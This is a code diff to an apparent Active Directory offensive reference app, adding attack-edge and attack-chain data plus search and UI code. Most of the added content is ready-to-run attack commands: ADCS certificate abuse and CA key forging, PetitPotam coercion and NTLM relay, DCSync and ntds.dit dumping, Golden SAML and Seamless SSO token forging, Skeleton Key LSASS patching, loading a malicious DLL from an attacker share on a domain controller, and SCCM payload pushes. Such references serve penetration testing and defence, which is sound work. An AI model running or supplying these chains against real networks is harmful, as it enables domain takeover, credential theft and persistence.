@@ -112,6 +112,7 @@ function DITHero({ counts }) {
     { depth: 0, connector: "", label: "DC=arsenal", sub: null, color: TEXT_PRIMARY },
     { depth: 1, connector: "├──", label: `OU=Commands`, sub: `${counts.entries} entries`, color: "#5B9BD5" },
     { depth: 1, connector: "├──", label: `OU=AttackPaths`, sub: `${counts.edges} edges`, color: "#A57BD8" },
+    { depth: 1, connector: "├──", label: `OU=AttackChains`, sub: `${counts.chains} chains`, color: "#8A9199" },
     { depth: 1, connector: "├──", label: `OU=Learnbook`, sub: `${counts.learn} topics`, color: "#3FBFA6" },
     { depth: 1, connector: "└──", label: `OU=CVEs`, sub: `${counts.cves} tracked`, color: "#E06C5C" },
   ];
@@ -3423,6 +3424,15 @@ const EDGES = [
     impact: "Current password/NTLM hash of the gMSA — impersonate the service account directly.",
   },
   {
+    id: "DumpSMSAPassword",
+    name: "DumpSMSAPassword",
+    target: "Delegated Managed Service Account (dMSA)",
+    category: "credread",
+    grants: "Read access to a dMSA's msDS-ManagedPassword — the same auto-rotated credential blob gMSAs use, but on the Windows Server 2025 dMSA object type BadSuccessor also targets.",
+    steps: ["gMSADumper.py -u $USER -p $PASS -d $DOMAIN"],
+    impact: "Current password/NTLM hash of the dMSA — and if it's actively preceding a privileged account (see BadSuccessor), that account's effective privilege too.",
+  },
+  {
     id: "SyncLAPSPassword",
     name: "SyncLAPSPassword",
     target: "Computer",
@@ -3711,6 +3721,42 @@ const EDGES = [
       "certipy relay -target 'rpc://$DC' -ca 'CA-NAME'",
     ],
     impact: "Same outcome as ESC8 — a certificate for the coerced machine account — via a transport that's easy to miss if only the HTTP endpoint was hardened.",
+  },
+  {
+    id: "ADCSESC12",
+    name: "ADCS ESC12",
+    target: "Certificate Authority (Private Key)",
+    category: "adcs",
+    grants: "The CA's private key material is stored somewhere weakly protected — a Shell PKI object, or an external HSM (e.g. a YubiHSM) left at its default PIN.",
+    steps: [
+      "certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -vulnerable",
+      "# Flags ESC12 automatically; exploitation is device-specific — recover the key material from the weakly-protected store (e.g. via the HSM's default PIN) and import it as the CA's own key.",
+    ],
+    impact: "Direct access to the CA's private signing key — see GoldenCert below for what that unlocks.",
+  },
+  {
+    id: "ADCSESC13",
+    name: "ADCS ESC13",
+    target: "Certificate Template",
+    category: "adcs",
+    grants: "An enrollable template's issuance policy OID is linked (via msDS-OIDToGroupLink) to a privileged group — enrolling maps you into that group without ever touching its membership.",
+    steps: [
+      "certipy req -u $USER@$DOMAIN -p $PASS -ca 'CA-NAME' -template 'OIDLinkedTemplate'",
+      "certipy auth -pfx $OUTFILE.pfx -dc-ip $DC",
+    ],
+    impact: "Effective membership in whatever group the issuance policy is linked to — a group-membership edge disguised as a certificate template.",
+  },
+  {
+    id: "GoldenCert",
+    name: "GoldenCert (CA Private Key Theft)",
+    target: "Certificate Authority",
+    category: "adcs",
+    grants: "Full local admin on the CA server itself — enough to export its private signing key directly.",
+    steps: [
+      "certipy ca -u $USER@$DOMAIN -p $PASS -ca 'CA-NAME' -backup",
+      "certipy forge -ca-pfx ca.pfx -upn administrator@$DOMAIN -subject 'CN=administrator,CN=Users,DC=corp,DC=local'",
+    ],
+    impact: "Forge a valid certificate for any user, entirely offline, bypassing every template restriction — the CA's own key signs it, so nothing about template EKUs or enrollment rights applies.",
   },
 
   // ---------------- Privileged built-in groups ----------------
@@ -4510,7 +4556,572 @@ const CHAINS = [
       ],
     },
   },
+
+  // ---------------- Batch 3: ADCS ESC2/3/6/7/9/10/11, and the hybrid/cloud identity graph ----------------
+  {
+    id: "esc3-enrollment-agent",
+    title: "ADCS ESC3 — Enrollment Agent → Mint a Cert for Anyone",
+    category: "adcs",
+    summary:
+      "A template with the Certificate Request Agent EKU lets its holder request certificates on behalf of other users entirely — the agent never has to touch the target's account at all.",
+    root: {
+      label: "Enroll in a template with the Certificate Request Agent EKU",
+      edgeId: "ADCSESC3",
+      children: [
+        {
+          label: "Get an agent certificate",
+          command: "certipy req -u $USER@$DOMAIN -p $PASS -ca 'CA-NAME' -template 'EnrollmentAgent'",
+          children: [
+            {
+              label: "Request a cert on behalf of Administrator",
+              command: "certipy req -u $USER@$DOMAIN -p $PASS -ca 'CA-NAME' -template 'User' -on-behalf-of '$DOMAIN\\administrator' -pfx agent.pfx",
+              children: [
+                {
+                  label: "PKINIT as Administrator",
+                  command: "certipy auth -pfx $OUTFILE.pfx -dc-ip $DC",
+                  children: [{ label: "Domain Admin", note: "without ever touching the target account" }],
+                },
+              ],
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "esc6-editf-san",
+    title: "ADCS ESC6 — CA-Wide SAN Injection → Domain-Wide ESC1",
+    category: "adcs",
+    summary:
+      "The EDITF_ATTRIBUTESUBJECTALTNAME2 flag lets any requester specify a Subject Alternative Name at request time — a CA-level misconfiguration that turns every enrollable template into ESC1 at once.",
+    root: {
+      label: "CA has EDITF_ATTRIBUTESUBJECTALTNAME2 set",
+      edgeId: "ADCSESC6",
+      children: [
+        {
+          label: "Request any enrollable template with an attacker-chosen SAN",
+          command: "certipy req -u $USER@$DOMAIN -p $PASS -ca 'CA-NAME' -template 'User' -upn administrator@$DOMAIN",
+          children: [
+            {
+              label: "PKINIT as Administrator",
+              command: "certipy auth -pfx $OUTFILE.pfx -dc-ip $DC",
+              children: [{ label: "Domain Admin", note: "from a template that was never meant to allow this" }],
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "esc7-manage-ca",
+    title: "ADCS ESC7 — Manage CA Rights → Enable a Vulnerable Template",
+    category: "adcs",
+    summary:
+      "Manage CA / Manage Certificates rights on the CA object don't touch any template directly — but they let you re-enable a dangerous one (like SubCA) that was disabled specifically to prevent this.",
+    root: {
+      label: "Manage CA / Manage Certificates rights on the CA object",
+      edgeId: "ADCSESC7",
+      children: [
+        {
+          label: "Re-enable the SubCA template",
+          command: "certipy ca -u $USER@$DOMAIN -p $PASS -ca 'CA-NAME' -enable-template 'SubCA'",
+          children: [
+            {
+              label: "Request a cert as Administrator from it",
+              command: "certipy req -u $USER@$DOMAIN -p $PASS -ca 'CA-NAME' -template 'SubCA' -upn administrator@$DOMAIN",
+              children: [{ label: "Domain Admin" }],
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "esc9-10-weak-mapping",
+    title: "ADCS ESC9 / ESC10 — Weak Cert Mapping + UPN Write → Takeover",
+    category: "adcs",
+    summary:
+      "Neither a security-extension-disabled template (ESC9) nor a DC in weak certificate-mapping mode (ESC10) is exploitable alone — both need a second, ordinary primitive: write access to the victim's userPrincipalName.",
+    root: {
+      label: "Write access to a victim's userPrincipalName",
+      note: "plus a no-security-extension template (ESC9) or weak StrongCertificateBindingEnforcement (ESC10)",
+      children: [
+        {
+          label: "Temporarily set the victim's UPN to Administrator's",
+          command: "certipy account update -u $USER@$DOMAIN -p $PASS -user $TARGETOBJECT -upn administrator",
+          children: [
+            {
+              label: "Request a certificate as the victim",
+              command: "certipy req -u $TARGETOBJECT@$DOMAIN -p $PASS -ca 'CA-NAME' -template 'User'",
+              children: [
+                {
+                  label: "Restore the victim's real UPN",
+                  command: "certipy account update -u $USER@$DOMAIN -p $PASS -user $TARGETOBJECT -upn $TARGETOBJECT",
+                  children: [
+                    {
+                      label: "PKINIT with the certificate",
+                      command: "certipy auth -pfx $OUTFILE.pfx -domain $DOMAIN",
+                      note: "the cert still carries the Administrator UPN it was issued with",
+                      children: [{ label: "Authenticates as Administrator" }],
+                    },
+                  ],
+                },
+              ],
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "esc11-rpc-relay",
+    title: "ADCS ESC11 — RPC Enrollment Relay → Domain Compromise",
+    category: "adcs",
+    summary:
+      "The ESC8 relay chain assumes HTTP web enrollment — ESC11 is the same idea over the CA's RPC (ICPR) interface, which skips Extended Protection entirely and stays exploitable even when the HTTP endpoint is hardened.",
+    root: {
+      label: "Coerce the DC to authenticate",
+      command: "python3 PetitPotam.py -d $DOMAIN -u $USER -p $PASS $ATTACKER $DC",
+      children: [
+        {
+          label: "Relay over RPC to the CA's enrollment interface",
+          edgeId: "ADCSESC11",
+          command: "certipy relay -target 'rpc://$DC' -ca 'CA-NAME'",
+          children: [{ label: "Certificate for the DC's machine identity", note: "→ same payoff as ESC8: full domain compromise" }],
+        },
+      ],
+    },
+  },
+  {
+    id: "aadconnect-onprem-compromise",
+    title: "AAD Connect Server → Sync Account → On-Prem Domain Compromise",
+    category: "credread",
+    summary:
+      "The AAD Connect / Entra Connect sync account holds Replicating Directory Changes rights on-prem by default — local admin on the sync server itself is effectively DCSync rights on the whole domain.",
+    root: {
+      label: "Local admin on the AAD Connect / Entra Connect server",
+      children: [
+        {
+          label: "Extract the sync account's credentials",
+          command: "Get-AADIntSyncCredentials",
+          children: [
+            {
+              label: "DCSync using the sync account",
+              command: "secretsdump.py $DOMAIN/$USER:$PASS@$DC -just-dc",
+              children: [{ label: "Full on-prem domain compromise", note: "from a server most environments don't treat as Tier 0" }],
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "seamlesssso-entra-access",
+    title: "Seamless SSO Abuse → Entra ID Access as Any User",
+    category: "credread",
+    summary:
+      "Seamless SSO's shared Kerberos key means DCSync-equivalent rights on-prem — nothing Entra-specific — are enough to forge Entra ID access as any synced user, silently, since Seamless SSO doesn't prompt for MFA.",
+    root: {
+      label: "GetChanges + GetChangesAll",
+      edgeId: "DCSync",
+      note: "held on the domain object",
+      children: [
+        {
+          label: "Dump the AZUREADSSOACC$ computer account hash",
+          command: "secretsdump.py $DOMAIN/$USER:$PASS@$DC -just-dc-user 'AZUREADSSOACC$'",
+          children: [
+            {
+              label: "Forge a Seamless SSO Kerberos ticket",
+              command: "$kerberos = New-AADIntKerberosTicket -SidString $SID -Hash $HASH",
+              children: [
+                {
+                  label: "Exchange it for a real Entra ID access token",
+                  command: "Get-AADIntAccessTokenForAADGraph -KerberosTicket $kerberos -Domain $DOMAIN",
+                  children: [{ label: "Entra ID access as any synced user, including Global Admins", note: "bypasses MFA — Seamless SSO is designed not to prompt" }],
+                },
+              ],
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "golden-saml-chain",
+    title: "AD FS Compromise → Golden SAML → Federated App Access",
+    category: "credread",
+    summary:
+      "AD FS's token-signing certificate is the trust anchor for every application federated to it — once it's stolen, forged SAML tokens survive password resets and even krbtgt rotation, since neither is involved.",
+    root: {
+      label: "Compromise the AD FS server",
+      note: "as the AD FS service account or SYSTEM",
+      children: [
+        {
+          label: "Extract the token-signing certificate",
+          command: "misc::adfs",
+          note: "or via the DKM container — see CVE-2026-56155",
+          children: [
+            {
+              label: "Forge a Golden SAML token",
+              command: "New-AADIntSAMLToken -ImmutableID $HASH -Certificate cert.pfx -Issuer 'http://$DC/adfs/services/trust'",
+              children: [
+                {
+                  label: "Access every application trusting this AD FS instance",
+                  note: "including Microsoft 365, as any user — no further contact with AD FS needed",
+                },
+              ],
+            },
+          ],
+        },
+      ],
+    },
+  },
+
+  // ---------------- Batch 4: AS-REP/Silver Ticket, gMSA, built-in-group abuse, relay variant, BadSuccessor ----------------
+  {
+    id: "asreproast-crack-lateral",
+    title: "AS-REP Roasting → Crack → Account Takeover",
+    category: "credread",
+    summary:
+      "No credential, no ACL right, no coercion needed — an account with Kerberos pre-auth disabled hands its AS-REP to anyone who asks, crackable exactly like a Kerberoast hash.",
+    root: {
+      label: "Find a pre-auth-disabled account",
+      note: "DONT_REQ_PREAUTH set on the userAccountControl flag",
+      children: [
+        {
+          label: "Request its AS-REP, no credentials needed",
+          command: "GetNPUsers.py $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $DC -format hashcat -outputfile $OUTFILE",
+          children: [
+            {
+              label: "Crack offline",
+              command: "hashcat -m 18200 asrep.txt rockyou.txt",
+              children: [
+                {
+                  label: "Account's plaintext password",
+                  children: [{ label: "Authenticate as the account", note: "→ whatever access/rights it holds" }],
+                },
+              ],
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "kerberoast-silver-ticket",
+    title: "Kerberoast → Silver Ticket",
+    category: "credread",
+    summary:
+      "A cracked service account's hash doesn't have to become an interactive logon — forged directly into a Silver Ticket, it grants access to that one service without ever touching the DC or krbtgt.",
+    root: {
+      label: "Kerberoast a service account and crack its hash",
+      edgeId: "WriteSPN",
+      note: "see the WriteSPN → Kerberoast chain for the full first half",
+      children: [
+        {
+          label: "Forge a Silver Ticket for that service",
+          command: "kerberos::golden /user:administrator /domain:$DOMAIN /sid:$SID /target:$DC /service:cifs /rc4:$HASH /ptt",
+          children: [
+            {
+              label: "Access to that one service only",
+              note: "quieter than a Golden Ticket — no krbtgt involved, harder to detect, but scoped to one SPN",
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "goldengmsa-domainwide",
+    title: "GoldenGMSA — KDS Root Key → Every gMSA in the Domain",
+    category: "credread",
+    summary:
+      "A single ReadGMSAPassword edge only gets you one service account — the KDS root key that AD itself uses to derive gMSA passwords gets you every current and future gMSA at once, computed entirely offline.",
+    root: {
+      label: "DA-equivalent rights, at least once",
+      note: "to read the KDS root key",
+      children: [
+        {
+          label: "Dump the KDS root key(s)",
+          command: "GoldenGMSA.exe kdsinfo",
+          children: [
+            {
+              label: "Compute any gMSA's password offline",
+              command: "GoldenGMSA.exe compute --sid $SID --kdskey <KDSKeyGUID-from-kdsinfo> --pwdid <ManagedPasswordID-of-target-gMSA>",
+              children: [{ label: "Every current and future gMSA in the domain", note: "no msDS-ManagedPassword read access ever needed" }],
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "dnsadmins-serverleveldll",
+    title: "DnsAdmins → ServerLevelPluginDll → SYSTEM on a DC",
+    category: "local",
+    summary:
+      "DnsAdmins can point the DNS Server service at an arbitrary DLL — since DNS almost always runs on a domain controller, that's kernel-adjacent code execution disguised as a config change.",
+    root: {
+      label: "MemberOf: DnsAdmins",
+      edgeId: "MemberOf-DnsAdmins",
+      children: [
+        {
+          label: "Point the DNS service at a malicious DLL",
+          command: "dnscmd $DC /config /serverlevelplugindll \\\\$ATTACKER\\share\\evil.dll",
+          children: [
+            {
+              label: "Restart the DNS service to load it",
+              command: "sc.exe \\\\$DC stop dns",
+              children: [{ label: "DLL loads under the DNS service's SYSTEM context", note: "on a domain controller" }],
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "backupoperators-ntds",
+    title: "Backup Operators → NTDS Extraction → Offline DCSync",
+    category: "local",
+    summary:
+      "SeBackupPrivilege bypasses every ACL for the backup API specifically — including the one protecting ntds.dit — so Backup Operators reaches the entire password database without ever calling DRSGetNCChanges.",
+    root: {
+      label: "MemberOf: Backup Operators",
+      edgeId: "MemberOf-BackupOperators",
+      note: "SeBackupPrivilege / SeRestorePrivilege on a DC",
+      children: [
+        {
+          label: "Shadow-copy the DC's volume",
+          command: "diskshadow /s diskshadow_script.txt",
+          children: [
+            {
+              label: "Pull ntds.dit and the SYSTEM hive out of the shadow copy",
+              command: "robocopy /b e:\\windows\\ntds\\ ntds_backup ntds.dit",
+              children: [
+                {
+                  label: "Dump every credential in the domain, entirely offline",
+                  command: "secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL",
+                  note: "same payoff as DCSync, without ever holding GetChanges/GetChangesAll",
+                },
+              ],
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "accountoperators-escalate",
+    title: "Account Operators → Object Manipulation → Escalation",
+    category: "local",
+    summary:
+      "Broad create/modify rights over non-protected objects is easy to underestimate — it's a direct path to a freshly created or repurposed account with whatever access the operator grants it next.",
+    root: {
+      label: "MemberOf: Account Operators",
+      edgeId: "MemberOf-AccountOperators",
+      note: "create/modify/delete rights over most non-protected objects, domain-wide",
+      children: [
+        {
+          label: "Add self to a group, or reset a non-protected user's password",
+          command: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add groupMember $TARGETOBJECT $USER",
+          children: [{ label: "Whatever access that group/account holds", note: "frequently chains into further privesc" }],
+        },
+      ],
+    },
+  },
+  {
+    id: "coercion-relay-smb",
+    title: "Coercion → NTLM Relay → SMB → Local Admin",
+    category: "credread",
+    summary:
+      "The baseline relay chain that the LDAP/ADCS variants build on: coerced authentication relayed straight to SMB on a target where the coerced identity already has admin rights.",
+    root: {
+      label: "Coerce a privileged account to authenticate",
+      note: "PrinterBug / PetitPotam / DFSCoerce",
+      command: "python3 PetitPotam.py -d $DOMAIN -u $USER -p $PASS $ATTACKER $DC",
+      children: [
+        {
+          label: "Relay to SMB on a target where that identity is admin",
+          command: "ntlmrelayx.py -tf targets.txt -smb2support",
+          children: [{ label: "Local admin / SYSTEM on every target where the relay succeeds" }],
+        },
+      ],
+    },
+  },
+  {
+    id: "privexchange-dcsync",
+    title: "PrivExchange → WriteDacl on Domain → DCSync → Golden Ticket",
+    category: "credread",
+    summary:
+      "Exchange's own machine account (and Exchange Windows Permissions members) holds WriteDacl on the domain object by default — a leftover install artifact that PrivExchange turns into a coercion primitive.",
+    root: {
+      label: "MemberOf: Exchange Windows Permissions",
+      edgeId: "MemberOf-ExchangeWindowsPermissions",
+      note: "WriteDacl on the domain object — a default artifact of installing Exchange",
+      children: [
+        {
+          label: "Coerce the Exchange server to authenticate",
+          command: "python3 privexchange.py -ah $ATTACKER $TARGET -u $USER -d $DOMAIN -p $PASS",
+          children: [
+            {
+              label: "Relay to LDAP, grant self DCSync",
+              command: "ntlmrelayx.py -t ldap://$DC --escalate-user $USER",
+              children: [
+                {
+                  label: "DCSync",
+                  command: "secretsdump.py $DOMAIN/$USER:$PASS@$DC -just-dc-user krbtgt",
+                  children: [{ label: "Golden Ticket", note: "→ Domain Admin, from an Exchange install nobody re-audited" }],
+                },
+              ],
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "badsuccessor-chain",
+    title: "BadSuccessor — Create Child → dMSA → Any Privileged Account",
+    category: "acl",
+    summary:
+      "Windows Server 2025's dMSA migration feature trusts msDS-ManagedAccountPrecededByLink without verifying any real migration relationship — Create Child rights on essentially any OU is enough to point a new dMSA at Domain Admin.",
+    root: {
+      label: "Create Child rights on any OU",
+      note: "a delegation common enough to be granted to helpdesk-tier groups",
+      children: [
+        {
+          label: "Create a dMSA preceding a privileged account",
+          command:
+            "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add badSuccessor $TARGETOBJECT -t 'CN=administrator,CN=Users,DC=corp,DC=local' --ou 'OU=Employees,DC=corp,DC=local' --prepatch",
+          children: [
+            {
+              label: "Windows treats this as a genuine privilege migration",
+              children: [{ label: "Authenticate as the dMSA", note: "→ inherits the preceded account's full effective privilege" }],
+            },
+          ],
+        },
+      ],
+    },
+  },
+
+  // ---------------- Batch 5: Skeleton Key, SCCM, RODC ----------------
+  {
+    id: "skeleton-key-persistence",
+    title: "Skeleton Key — Universal Master Password",
+    category: "acl",
+    summary:
+      "Patched directly into LSASS on a live DC, this doesn't touch any account's real password at all — every account suddenly authenticates with either its own password or the same attacker-chosen master password.",
+    root: {
+      label: "DA-equivalent rights on a domain controller",
+      children: [
+        {
+          label: "Patch LSASS in memory",
+          command: "privilege::debug\nmisc::skeleton",
+          children: [
+            {
+              label: "Every account now accepts a second, universal password",
+              note: "in-memory only — cleared on reboot, doesn't survive a DC restart",
+              children: [{ label: "Authenticate as any user, domain-wide", note: "without ever knowing or resetting their real password" }],
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "sccm-site-takeover",
+    title: "SCCM Site Server Coercion → Relay → Push Payload to Every Managed Device",
+    category: "credread",
+    summary:
+      "Coercing the SCCM site server's own machine account plays out just like PetitPotam against a DC — except the payoff is administrative control of every endpoint SCCM manages, often a far larger blast radius than the site server itself.",
+    root: {
+      label: "Coerce the SCCM site server to authenticate",
+      children: [
+        {
+          label: "Relay to gain site-level administrative access",
+          command: "sccmhunter.py relay -u $USER -p $PASS -d $DOMAIN -ip $DC",
+          children: [
+            {
+              label: "Full Administrator on the SCCM console/AdminService",
+              children: [
+                {
+                  label: "Push and execute a payload on any managed device",
+                  command: "SharpSCCM.exe exec -d $TARGETOBJECT -sms-provider $TARGET -payload cmd.exe",
+                  note: "legitimate SCCM deployment functionality, used offensively",
+                  children: [{ label: "Code execution on every device SCCM manages" }],
+                },
+              ],
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "sccm-naa-lateral",
+    title: "SCCM Network Access Account → Lateral Movement",
+    category: "credread",
+    summary:
+      "Any device SCCM manages caches the Network Access Account's credential locally so the client can reach deployment content — local admin on one managed endpoint is enough to read it, no site-level access required.",
+    root: {
+      label: "Local admin on any SCCM-managed device",
+      children: [
+        {
+          label: "Read the cached Network Access Account credential",
+          command: "SharpSCCM.exe local naa",
+          children: [
+            {
+              label: "NAA credential",
+              note: "used by every client to reach SCCM content shares",
+              children: [
+                {
+                  label: "Alternative: decrypt captured PXE boot media",
+                  command: "SharpSCCM.exe get pxe -f media.pxe -p 'MediaPassword'",
+                  note: "same NAA/task-sequence secrets, no managed endpoint needed — just captured PXE traffic",
+                },
+              ],
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "rodc-filtered-dcsync",
+    title: "RODC Filtered Replication — DCSync Variant",
+    category: "credread",
+    summary:
+      "An RODC-linked account with GetChangesInFilteredSet rights doesn't grant full DCSync — but the filtered attribute set it does cover still leaks real secrets, without ever needing GetChanges/GetChangesAll on the domain object.",
+    root: {
+      label: "GetChangesInFilteredSet",
+      edgeId: "GetChangesInFilteredSet",
+      note: "narrower than full DCSync — commonly seen on RODC-related accounts",
+      children: [
+        {
+          label: "Dump the accounts within the filtered set",
+          command: "secretsdump.py $DOMAIN/$USER:$PASS@$DC -just-dc-user $TARGETOBJECT",
+          children: [{ label: "Secrets for accounts the RODC is allowed to cache", note: "scoped, not domain-wide like full DCSync" }],
+        },
+      ],
+    },
+  },
 ];
+
+// Flattens every label/note/command in a chain's node tree into one
+// lowercase string, so global search can match on a step deep inside a
+// chain (e.g. "S4U2Proxy") even though that term never appears in the
+// chain's own title/summary. CHAINS is static, so this runs once at module
+// load rather than being recomputed on every search keystroke.
+function chainSearchText(chain) {
+  const parts = [chain.title, chain.summary];
+  const walk = (node) => {
+    parts.push(node.label, node.note, node.command);
+    node.children?.forEach(walk);
+  };
+  walk(chain.root);
+  return parts.filter(Boolean).join(" ").toLowerCase();
+}
+const CHAIN_SEARCH_TEXT = new Map(CHAINS.map((c) => [c.id, chainSearchText(c)]));
 
 // ============================================================
 // LEARNBOOK — why/how/effect explanations, separate from the
@@ -6100,7 +6711,8 @@ export default function ADArsenal() {
     const cves = CVES.filter(
       (c) => c.cveId.toLowerCase().includes(q) || c.title.toLowerCase().includes(q) || c.summary.toLowerCase().includes(q)
     );
-    return { entries, edges, learn, cves };
+    const chains = CHAINS.filter((c) => CHAIN_SEARCH_TEXT.get(c.id).includes(q));
+    return { entries, edges, learn, cves, chains };
   }, [globalQuery]);
 
   // Esc clears the global search from anywhere on the page.
@@ -6173,7 +6785,9 @@ export default function ADArsenal() {
             </div>
           </div>
 
-          <DITHero counts={{ entries: ENTRIES.length, edges: EDGES.length, learn: LEARN.length, cves: CVES.length }} />
+          <DITHero
+            counts={{ entries: ENTRIES.length, edges: EDGES.length, chains: CHAINS.length, learn: LEARN.length, cves: CVES.length }}
+          />
         </div>
 
         <MenuDrawer
@@ -6226,8 +6840,12 @@ export default function ADArsenal() {
         {globalResults ? (
           <div className="space-y-8">
             <p className="text-xs" style={{ color: STRUCTURAL, fontFamily: FONT_MONO }}>
-              {globalResults.entries.length + globalResults.edges.length + globalResults.learn.length + globalResults.cves.length}{" "}
-              results across Commands, Attack Paths, Learnbook, and CVEs
+              {globalResults.entries.length +
+                globalResults.edges.length +
+                globalResults.chains.length +
+                globalResults.learn.length +
+                globalResults.cves.length}{" "}
+              results across Commands, Attack Paths, Attack Chains, Learnbook, and CVEs
             </p>
 
             {globalResults.cves.length > 0 && (
@@ -6269,6 +6887,19 @@ export default function ADArsenal() {
               </div>
             )}
 
+            {globalResults.chains.length > 0 && (
+              <div>
+                <h2 className="text-[13px] uppercase tracking-wide mb-3" style={{ color: SIGNATURE, fontFamily: FONT_MONO }}>
+                  Attack Chains ({globalResults.chains.length})
+                </h2>
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                  {globalResults.chains.map((c) => (
+                    <ChainCard key={c.id} chain={c} values={values} />
+                  ))}
+                </div>
+              </div>
+            )}
+
             {globalResults.learn.length > 0 && (
               <div>
                 <h2 className="text-[13px] uppercase tracking-wide mb-3" style={{ color: SIGNATURE, fontFamily: FONT_MONO }}>
@@ -6282,7 +6913,12 @@ export default function ADArsenal() {
               </div>
             )}
 
-            {globalResults.entries.length + globalResults.edges.length + globalResults.learn.length + globalResults.cves.length === 0 && (
+            {globalResults.entries.length +
+              globalResults.edges.length +
+              globalResults.chains.length +
+              globalResults.learn.length +
+              globalResults.cves.length ===
+              0 && (
               <div className="text-center py-16 text-sm" style={{ color: STRUCTURAL, fontFamily: FONT_MONO }}>
                 Nothing matches that search anywhere in the reference.
               </div>
